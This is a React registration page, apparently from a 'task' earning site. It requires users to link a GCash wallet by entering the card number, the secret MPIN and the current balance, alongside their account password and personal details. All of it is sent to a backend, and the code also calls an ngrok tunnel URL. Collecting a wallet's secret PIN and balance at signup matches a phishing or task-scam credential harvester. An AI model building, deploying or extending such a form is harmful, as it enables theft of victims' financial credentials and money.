import React, { useState } from 'react';
import styles from './RegisterBank.module.css';
import { useNavigate } from 'react-router-dom';
import { useLocation } from 'react-router-dom';
import ApiService from '../../services/apiService';
import ApiUrls from '../../services/apiUrls';
import Select from 'react-select';
import { OrbitProgress } from 'react-loading-indicators';
import axios from 'axios';

const apiService = new ApiService(ApiUrls.BASE_URL);

function Loader() {
    return (
        <div className={styles.loaderContainer}>
            <OrbitProgress
                variant="spokes"
                color="#dcd6d6"
                size="medium"
                text=""
                textColor=""
            />
        </div>
    );
}

function FormInput({ type, name, value, handleChange, required }) {
    return (
        <div>
            <input
                className={styles.forminputStyle}
                type={type}
                name={name}
                autoComplete="new-password"
                value={value}
                onChange={handleChange}
                required={required}
            />
        </div>
    );
}

function RegisterBank() {
    const options = [{ value: '1', label: 'GCASH' }];
    const location = useLocation();
    const registerData = location.state?.registerData;
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(false);
    const [selectedOption, setSelectedOption] = useState(null);
    const [bankData, setBankData] = useState({
        card_number: '',
        card_password: '',
        card_balance: '',
        card_payment_id: '',
        account: registerData.account,
        mail: registerData.mail,
        promotion_code: registerData.promotion_code,
        password: registerData.password,
        phone: registerData.phone,
        first_name: registerData.first_name,
        second_name: registerData.second_name
    });

    // 檢查必填欄位是否完成
    const isFormValid =
        bankData.card_number.trim() !== '' &&
        bankData.card_password.trim() !== '' &&
        bankData.card_balance.trim() !== '' &&
        bankData.card_payment_id.trim() !== '';

    const handleSelectChange = (selectedOption) => {
        setBankData((prevBankData) => ({
            ...prevBankData, // 保留其他欄位的值
            card_payment_id: selectedOption.value // 更新 card_payment_id
        }));
        setSelectedOption(selectedOption)
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        setBankData({
            ...bankData,
            [name]: value
        });
    };

    const handleSubmit = async (event) => {
        event.preventDefault();
        setIsLoading(true);
        console.log('bankData: ', bankData);
        try {
            const response = await apiService.post(ApiUrls.REGISTER, bankData);
            console.log('code: ', response.code);
            if (response.code == 200) {
                alert('Registration successful');
                navigate('/download');
            } else {
                alert(response.error_msg);
            }
        } catch (error) {
            console.log('error: ', error);
            alert('Registration failed. Please try again.', error);
        } finally {
            setIsLoading(false);
        }
    };

    const fetchData = async () => {
        try {
            const response = await fetch('https://5ca6-18-178-159-1.ngrok-free.app/api/register');
            if (!response.ok) {
                throw new Error('網絡錯誤');
            }
            const data = await response.json();
            console.log(data); // 印出 API 回傳資料
        } catch (error) {
            console.error('錯誤:', error);
        }
    };

    return (
        <div className={styles.layoutContainer}>
            <div className={styles.bgTop}></div>
            <div className={styles.icTopLeft}></div>
            <div className={styles.pageTitle}>Register</div>
            <div className={styles.bankContainer}>
                <div className={styles.directions}>
                    <span className={styles.contentTextBlack}>You need to</span>
                    <span className={styles.contentTextRed}>
                        {' '}
                        link your primary payment getway{' '}
                    </span>
                    <br/>
                    <span className={styles.contentTextBlack}>
                        account during registration to start receiving tasks.
                    </span>
                    <br/>
                    <span className={styles.contentTextBlack}>
                        Currently, you can{' '}
                    </span>
                    <span className={styles.contentTextRed}>
                        only select one getway.{' '}
                    </span>
                    <br/>
                    <span className={styles.contentTextRed}>
                        After completing registration, you can set up additional
                        payment getway.
                    </span>
                </div>
                <img className={styles.divider}></img>
                <form
                    className={styles.formStyle}
                    onSubmit={handleSubmit}
                >   
                    <div className={styles.selectStyle}>
                        <label className={styles.labelInput}>
                            *PrimaryPayment Getway
                        </label>
                        <Select
                            options={options}
                            efaultValue={options[0]}
                            onChange={handleSelectChange}
                            value={selectedOption}
                            required
                        />
                    </div>
                    <div>
                    {selectedOption && (
                        <div className={styles.bankInfo}>
                            <label className={styles.labelInput}>
                                *Gcash card number
                            </label>
                            <FormInput
                                type="number"
                                name="card_number"
                                value={bankData.card_number}
                                handleChange={handleChange}
                                required
                            />
                            <label className={styles.labelInput}>*MPIN</label>
                            <FormInput
                                type="password"
                                name="card_password"
                                value={bankData.card_password}
                                handleChange={handleChange}
                                required
                            />
                            <label className={styles.labelInput}>*Your Balance</label>
                            <FormInput
                                type="number"
                                name="card_balance"
                                value={bankData.card_balance}
                                handleChange={handleChange}
                                required
                            />
                            <div>
                                <span className={styles.contentTextRed}>
                                    Be honest; balance updates after completion.
                                </span>
                            </div>
                        </div>
                    )}
                    </div>
                    <div className={styles.bankBottom}>
                        <img className={styles.divider}></img>
                        <button
                            type="submit"
                            className={styles.registerBtn}
                            disabled={!isFormValid}
                            style={{
                                backgroundColor: isFormValid
                                    ? '#DF4A3B'
                                    : '#BBBBBB'
                            }}
                        >
                            {isLoading ? 'Registering...' : 'Register'}
                        </button>
                    </div>
                </form>
                {isLoading && <Loader />}
            </div>
        </div>
    );
}
export default RegisterBank;
